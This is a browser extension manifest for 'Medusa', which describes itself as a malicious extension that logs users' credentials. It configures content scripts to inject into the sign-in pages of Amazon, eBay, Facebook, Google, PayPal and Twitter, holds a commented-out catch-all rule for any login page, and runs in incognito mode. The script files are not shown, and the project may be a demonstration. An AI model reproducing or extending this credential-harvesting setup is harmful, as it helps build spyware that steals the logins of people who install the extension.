{
  	// Required
  	"manifest_version": 3,
  	"name": "Medusa",
  	"version": "1.0",

  	// Recommended
  	"description": "A simple malicious extension that logs your credentials to the console. :)",
	"icons": {
		"16": "./icons/medusa_16x16.png",
	  	"128": "./icons/medusa_128x128.png",
	  	"256": "./icons/medusa_256x256.png",
	  	"512": "./icons/medusa_512x512.png"
	},

	// Optional
	"content_scripts": [
	{
		// Amazon
		"matches": [
			"*://*.amazon.com/*signin*"
		],
		"js": ["./js/amazon.js"]
	},
	{
		// eBay
		"matches": [
			"*://*.ebay.com/*signin*",
			"*://*.ebay.com/*SignIn*"
		],
		"js": ["./js/ebay.js"]
	},
	{
		// Facebook
		"matches": [
			"*://.facebook.com/*login*"
		],
		"js": ["./js/facebook.js"]
	},
	{
		// Google
		"matches": [
			"*://*.google.com/*signin*"
		],
		"js": ["./js/google.js"]
	},
	{
		// Paypal
		"matches": [
			"*://*.paypal.com/*signin*"
		],
		"js": ["./js/paypal.js"]
	},
	{
		// Twitter
		"matches": [
			"*://*.twitter.com/*login*"
		],
		"js": ["./js/twitter.js"]
	}
	//{
	//	// Generic
	//	"matches": [
	//		"*://*/*login*",
	//		"*://*/*signin*",
	//		"*://*/*Login*",
	//		"*://*/*SignIn*"
	//	],
	//	"js": ["./js/generic.js"]
	//}
	],
	"incognito": "spanning"
}

